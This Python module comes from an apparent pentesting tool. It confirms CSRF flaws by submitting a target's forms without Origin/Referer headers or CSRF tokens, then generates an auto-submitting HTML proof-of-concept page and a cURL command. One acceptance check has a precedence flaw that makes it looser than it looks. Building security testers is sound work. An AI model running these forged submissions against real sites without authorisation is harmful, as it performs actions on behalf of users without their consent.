"""
GlitchForge Pentester - CSRF Validator
Proves CSRF vulnerabilities by testing cross-origin request acceptance.
"""

import time
from typing import Dict, Optional
from urllib.parse import urlparse, parse_qs

from bs4 import BeautifulSoup

from app.core.scanner.base_scanner import VulnerabilityResult
from .base_validator import BaseValidator
from .data_models import (
    PentestResult, PentestEvidence,
    VerificationStatus, ExploitTechnique
)


class CSRFValidator(BaseValidator):
    """
    CSRF exploitation validator.

    Techniques:
    1. No-origin submission: Submit form without Origin/Referer headers
    2. Token omission: Submit form without CSRF token and check acceptance
    """

    def validate(self, vuln: VulnerabilityResult) -> PentestResult:
        """Attempt to validate CSRF by submitting forms without protection"""
        start_time = time.time()
        attempts = 0

        # Technique 1: Submit without Origin/Referer
        result = self._try_no_origin_submit(vuln)
        attempts += 1
        if result and result.verification_status == VerificationStatus.CONFIRMED:
            result.duration_seconds = time.time() - start_time
            result.attempts = attempts
            return result

        # Technique 2: Submit without CSRF token
        result = self._try_token_omission(vuln)
        attempts += 1
        if result and result.verification_status == VerificationStatus.CONFIRMED:
            result.duration_seconds = time.time() - start_time
            result.attempts = attempts
            return result

        # CSRF is harder to definitively prove without state change observation
        return PentestResult(
            vulnerability_url=vuln.url,
            vulnerability_parameter=vuln.parameter,
            vulnerability_type=vuln.vuln_type.value,
            verification_status=(
                VerificationStatus.LIKELY if vuln.confidence >= 0.75
                else VerificationStatus.UNVERIFIED
            ),
            confidence=vuln.confidence * 0.8,
            attempts=attempts,
            duration_seconds=time.time() - start_time
        )

    def _try_no_origin_submit(
        self, vuln: VulnerabilityResult
    ) -> Optional[PentestResult]:
        """
        Submit form stripping Origin and Referer headers.
        If the server processes the request successfully, CSRF is confirmed.
        """
        self.logger.debug(f"Trying no-origin CSRF submit on {vuln.url}")

        # First, fetch the page to find forms
        page_resp = self.make_request(vuln.url)
        if not page_resp:
            return None

        soup = BeautifulSoup(page_resp.content, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            return None

        for form in forms:
            method = (form.get('method') or 'GET').upper()
            action = form.get('action') or ''

            # Resolve action URL
            if action.startswith('http'):
                form_url = action
            elif action.startswith('/'):
                parsed = urlparse(vuln.url)
                form_url = f"{parsed.scheme}://{parsed.netloc}{action}"
            else:
                form_url = vuln.url

            # Collect form fields (skip CSRF tokens, fill with test data)
            form_data = {}
            for inp in form.find_all(['input', 'select', 'textarea']):
                name = inp.get('name')
                if not name:
                    continue

                input_type = inp.get('type', 'text').lower()
                value = inp.get('value', '')

                # Skip CSRF tokens
                if any(t in name.lower() for t in ['csrf', 'token', 'xsrf', '_csrf']):
                    continue

                if input_type == 'password':
                    form_data[name] = 'testpassword123'
                elif input_type == 'submit':
                    form_data[name] = value or 'Submit'
                elif input_type == 'hidden':
                    form_data[name] = value
                else:
                    form_data[name] = value or 'test'

            if not form_data:
                continue

            # Submit WITHOUT Origin/Referer headers (simulating cross-origin)
            custom_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                # Deliberately omitting Origin and Referer
            }

            if method == 'POST':
                response = self.make_request(
                    form_url, method='POST', data=form_data,
                    headers=custom_headers
                )
            else:
                response = self.make_request(
                    form_url, method='GET', params=form_data,
                    headers=custom_headers
                )

            if not response:
                continue

            # Check if the request was accepted (not rejected)
            # Indicators of acceptance: 200 OK, 302 redirect, success messages
            accepted = (
                response.status_code in (200, 302, 301, 303) and
                response.status_code != 403 and
                'csrf' not in response.text.lower().split('token')[0] if 'token' in response.text.lower() else True
            )

            # Check for rejection indicators
            rejected = (
                response.status_code == 403 or
                'csrf token' in response.text.lower() or
                'invalid token' in response.text.lower() or
                'forbidden' in response.text.lower()
            )

            if accepted and not rejected:
                self.logger.info("CSRF confirmed: form accepted without Origin/Referer")

                exchange = self.capture_exchange(
                    response,
                    request_body=str(form_data)
                )

                # Generate a PoC HTML page
                form_inputs = '\n    '.join(
                    f'<input type="hidden" name="{k}" value="{v}" />'
                    for k, v in form_data.items()
                )
                poc_html = (
                    f'<!-- CSRF Proof of Concept -->\n'
                    f'<html>\n<body>\n'
                    f'<form action="{form_url}" method="{method}">\n'
                    f'    {form_inputs}\n'
                    f'    <input type="submit" value="Click me" />\n'
                    f'</form>\n'
                    f'<script>document.forms[0].submit();</script>\n'
                    f'</body>\n</html>'
                )

                curl_cmd = self.generate_curl(
                    form_url, method=method,
                    data=form_data if method == 'POST' else None,
                    params=form_data if method == 'GET' else None
                )

                evidence = PentestEvidence(
                    technique=ExploitTechnique.CSRF_NO_ORIGIN,
                    http_exchanges=[exchange],
                    poc_command=f"# cURL command:\n{curl_cmd}\n\n# HTML PoC (save as .html and open in browser):\n{poc_html}",
                    extracted_data=[
                        f"Form action: {form_url}",
                        f"Method: {method}",
                        f"Response status: {response.status_code}",
                        "No Origin/Referer headers sent",
                        "No CSRF token included",
                        "Request was accepted by server"
                    ],
                    impact_description=(
                        f"CSRF confirmed: the form at {form_url} accepts submissions "
                        f"without Origin/Referer verification or CSRF tokens. "
                        f"An attacker could host a malicious page that automatically "
                        f"submits this form on behalf of any authenticated user who visits it, "
                        f"performing state-changing actions without the user's consent."
                    ),
                    reproduction_steps=[
                        f"Save the HTML PoC above to a file (e.g., csrf_poc.html)",
                        "Ensure you are logged into the target application in your browser",
                        "Open the PoC file in the same browser",
                        f"Observe that the form at {form_url} is submitted automatically",
                        f"The server returns HTTP {response.status_code} (accepted)"
                    ]
                )

                return PentestResult(
                    vulnerability_url=vuln.url,
                    vulnerability_parameter=vuln.parameter,
                    vulnerability_type=vuln.vuln_type.value,
                    verification_status=VerificationStatus.CONFIRMED,
                    confidence=0.90,
                    evidence=evidence
                )

        return None

    def _try_token_omission(
        self, vuln: VulnerabilityResult
    ) -> Optional[PentestResult]:
        """
        If the form has a CSRF token field, submit without the token.
        If accepted, the token validation is broken.
        """
        self.logger.debug(f"Trying token omission on {vuln.url}")

        page_resp = self.make_request(vuln.url)
        if not page_resp:
            return None

        soup = BeautifulSoup(page_resp.content, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            method = (form.get('method') or 'GET').upper()
            action = form.get('action') or ''

            if action.startswith('http'):
                form_url = action
            elif action.startswith('/'):
                parsed = urlparse(vuln.url)
                form_url = f"{parsed.scheme}://{parsed.netloc}{action}"
            else:
                form_url = vuln.url

            # Collect all fields, identify CSRF token fields
            form_data = {}
            csrf_fields = []

            for inp in form.find_all(['input', 'select', 'textarea']):
                name = inp.get('name')
                if not name:
                    continue

                input_type = inp.get('type', 'text').lower()
                value = inp.get('value', '')

                if any(t in name.lower() for t in ['csrf', 'token', 'xsrf', '_csrf']):
                    csrf_fields.append(name)
                    continue  # Skip CSRF token

                if input_type == 'password':
                    form_data[name] = 'testpassword123'
                elif input_type == 'submit':
                    form_data[name] = value or 'Submit'
                elif input_type == 'hidden':
                    form_data[name] = value
                else:
                    form_data[name] = value or 'test'

            # Only test if there was a CSRF token field to omit
            if not csrf_fields or not form_data:
                continue

            # Submit without the CSRF token
            if method == 'POST':
                response = self.make_request(form_url, method='POST', data=form_data)
            else:
                response = self.make_request(form_url, method='GET', params=form_data)

            if not response:
                continue

            rejected = (
                response.status_code == 403 or
                'csrf' in response.text.lower() or
                'invalid token' in response.text.lower() or
                'token' in response.text.lower() and 'missing' in response.text.lower()
            )

            if not rejected and response.status_code in (200, 302, 301, 303):
                self.logger.info(
                    f"CSRF token omission accepted: {csrf_fields} field(s) skipped"
                )

                exchange = self.capture_exchange(response, request_body=str(form_data))
                curl_cmd = self.generate_curl(
                    form_url, method=method,
                    data=form_data if method == 'POST' else None,
                    params=form_data if method == 'GET' else None
                )

                evidence = PentestEvidence(
                    technique=ExploitTechnique.CSRF_TOKEN_OMIT,
                    http_exchanges=[exchange],
                    poc_command=curl_cmd,
                    extracted_data=[
                        f"CSRF token field(s) omitted: {', '.join(csrf_fields)}",
                        f"Form submitted without token",
                        f"Response status: {response.status_code}",
                        "Server accepted the request without CSRF validation"
                    ],
                    impact_description=(
                        f"CSRF token validation is broken. The form contains CSRF token "
                        f"field(s) ({', '.join(csrf_fields)}) but the server accepts "
                        f"submissions without them. This means the CSRF protection is "
                        f"not enforced, leaving users vulnerable to cross-site request forgery."
                    ),
                    reproduction_steps=[
                        f"Navigate to {vuln.url}",
                        f"Submit the form without the {', '.join(csrf_fields)} field(s)",
                        f"The server returns HTTP {response.status_code} instead of rejecting",
                        "This proves CSRF token validation is not enforced"
                    ]
                )

                return PentestResult(
                    vulnerability_url=vuln.url,
                    vulnerability_parameter=vuln.parameter,
                    vulnerability_type=vuln.vuln_type.value,
                    verification_status=VerificationStatus.CONFIRMED,
                    confidence=0.92,
                    evidence=evidence
                )

        return None
